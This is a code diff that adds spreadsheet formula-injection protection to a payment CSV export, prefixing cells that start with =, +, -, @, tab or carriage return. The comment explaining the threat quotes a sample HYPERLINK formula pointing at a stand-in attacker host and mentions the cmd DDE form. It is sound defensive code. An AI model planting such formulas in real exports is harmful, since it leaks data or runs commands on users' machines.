@@ -17,10 +17,37 @@ const { requirePaymentPermission, logPaymentAction } = require('../_lib/paymentP
 // CSV helpers
 // ---------------------------------------------------------------------------
 
-/** Wrap a field value in double-quotes and escape any internal double-quotes. */
+// Characters that make Excel, LibreOffice and Google Sheets treat a cell as a
+// formula rather than text. Quoting does NOT disarm them: `"=1+1"` is still
+// evaluated on open.
+const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;
+
+/**
+ * Wrap a field value in double-quotes, escape internal double-quotes, and
+ * neutralise spreadsheet formula injection.
+ *
+ * Scope spec §14: "Exports are permission-controlled, logged and protected
+ * against spreadsheet formula injection." §15.1 lists CSV sanitization as a
+ * unit-test requirement. Only the quoting half was implemented.
+ *
+ * It matters here because the values are attacker-supplied in the ordinary
+ * course of business: a creator sets their own name, payout_email and
+ * payment_handle, and all three land in the batch CSV that an owner opens in
+ * Excel to make the payments. A name of
+ *
+ *     =HYPERLINK("https://evil.example/"&A2,"Click")
+ *
+ * becomes a live link built from the neighbouring cell; the =cmd|'/c ...'!A1
+ * form is worse still on Windows.
+ *
+ * Prefixing a single quote is the standard remedy: the cell displays as typed
+ * and is never evaluated. Tabs and carriage returns are included because they
+ * can smuggle a trigger past a naive first-character check.
+ */
 function csvField(value) {
   const str = value == null ? '' : String(value);
-  return `"${str.replace(/"/g, '""')}"`;
+  const safe = FORMULA_TRIGGERS.test(str) ? `'${str}` : str;
+  return `"${safe.replace(/"/g, '""')}"`;
 }
 
 /** Join an array of raw values into a single CSV row string. */
